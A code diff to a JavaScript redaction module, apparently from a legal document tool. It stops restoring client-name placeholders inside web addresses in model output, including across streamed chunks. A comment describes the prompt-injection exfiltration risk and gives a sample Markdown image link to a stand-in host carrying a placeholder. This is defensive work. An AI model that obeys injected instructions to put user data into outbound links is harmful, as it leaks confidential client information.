@@ -32,6 +32,24 @@ const { DATA_DIR } = require('./config')
 const detect = require('./pii_detect')
 
 const STORE_DIR = path.join(DATA_DIR, 'redaction')
+
+// Placeholders inside a web address are never restored (prompt injection):
+// an instruction hidden in a document can make the model build a link or an
+// image address from client data ("![](https://x.example/?d=[[PARTY_1]])").
+// Restoring it would put the real name into the address, which a front end
+// or a web tool could then send out. Kept as a placeholder, it carries
+// nothing. An address runs from its scheme (or "www.", "mailto:", a
+// Markdown link target "](") up to the next space, quote or angle bracket.
+const URL_CONTEXT = 2048
+const URL_START_RE = /[a-z][a-z0-9+.-]*:\/\/|\bwww\.|\bmailto:|\]\(/gi
+function insideUrl(text) {
+  const spans = []
+  for (const m of text.matchAll(URL_START_RE)) {
+    const rest = text.slice(m.index).match(/^[^\s<>"'`]*/)[0]
+    spans.push([m.index, m.index + rest.length])
+  }
+  return (i) => spans.some(([a, b]) => i >= a && i < b)
+}
 const SAFE_ID = /^[\w-]{1,80}$/
 
 // ── stable placeholders per matter ──────────────────────────────────────
@@ -123,15 +141,23 @@ class Redactor {
     return messages.map((m) => ({ ...m, content: typeof m.content === 'string' ? this.redact(m.content) : m.content }))
   }
 
-  /** Restore placeholders (also tolerates models dropping one bracket). */
-  restore(text) {
+  /**
+   * Restore placeholders (also tolerates models dropping one bracket).
+   * Never inside a web address (see insideUrl): `before` is the text that
+   * came just before (streaming), so an address split across chunks counts.
+   */
+  restore(text, before = '') {
     if (!this.state.orig.size) return text
-    return String(text ?? '').replace(/\[?\[\[?([A-Z]+_\d+)\]\]?\]?/g, (m, id) => this.state.orig.get(`[[${id}]]`) ?? m)
+    const s = String(text ?? '')
+    const ctx = String(before || '').slice(-URL_CONTEXT)
+    const inUrl = insideUrl(ctx + s)
+    return s.replace(/\[?\[\[?([A-Z]+_\d+)\]\]?\]?/g, (m, id, off) => (inUrl(ctx.length + off) ? m : this.state.orig.get(`[[${id}]]`) ?? m))
   }
 
   /** Wrap a streaming callback: hold back a possibly split placeholder until it is complete. */
   streamRestorer(onContent) {
     let pending = ''
+    let sent = '' // the raw text already passed on (for addresses split across chunks)
     return {
       push: (chunk) => {
         pending += chunk
@@ -140,9 +166,9 @@ class Redactor {
         const cut = tail ? tail.index : pending.length
         const ready = pending.slice(0, cut)
         pending = pending.slice(cut)
-        if (ready) onContent(this.restore(ready))
+        if (ready) { onContent(this.restore(ready, sent)); sent = (sent + ready).slice(-URL_CONTEXT) }
       },
-      flush: () => { if (pending) { onContent(this.restore(pending)); pending = '' } },
+      flush: () => { if (pending) { onContent(this.restore(pending, sent)); sent = (sent + pending).slice(-URL_CONTEXT); pending = '' } },
     }
   }
 
@@ -191,4 +217,4 @@ function forMatter(matterId) {
   return new Redactor({ terms: [...t.terms, ...(review?.terms || [])], keep: [...t.keep, ...(review?.keep || [])], patterns: t.patterns, matterId: matterId || null })
 }
 
-module.exports = { Redactor, forMatter, termsFor, forget, STORE_DIR }
+module.exports = { Redactor, forMatter, termsFor, forget, insideUrl, STORE_DIR }
